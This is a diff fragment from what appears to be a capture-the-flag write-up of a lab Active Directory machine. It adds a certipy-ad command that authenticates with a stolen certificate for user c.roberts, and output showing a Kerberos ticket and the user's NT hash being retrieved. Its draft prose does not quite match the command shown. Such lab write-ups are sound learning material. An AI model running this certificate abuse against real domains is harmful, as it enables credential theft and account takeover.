@@ -318,4 +318,23 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'c.roberts.pfx'
 ```
 
-Ill 
+Ill first just make the request specifying the CA and the template
+
+```python
+❯❯❯ faketime -f +8h certipy-ad auth -pfx c.roberts.pfx -dc-ip 10.129.245.56
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'C.Roberts@ping.htb'
+[*]     Security Extension SID: 'S-1-5-21-750635624-2058721901-1932338391-2617'
+[*] Using principal: 'c.roberts@ping.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'c.roberts.ccache'
+File 'c.roberts.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'c.roberts.ccache'
+[*] Trying to retrieve NT hash for 'c.roberts'
+[*] Got hash for 'c.roberts@ping.htb': aad3b435b51404eeaad3b435b51404ee:2475be69d40e815588a85fd89c7a439d
+```
+
+T
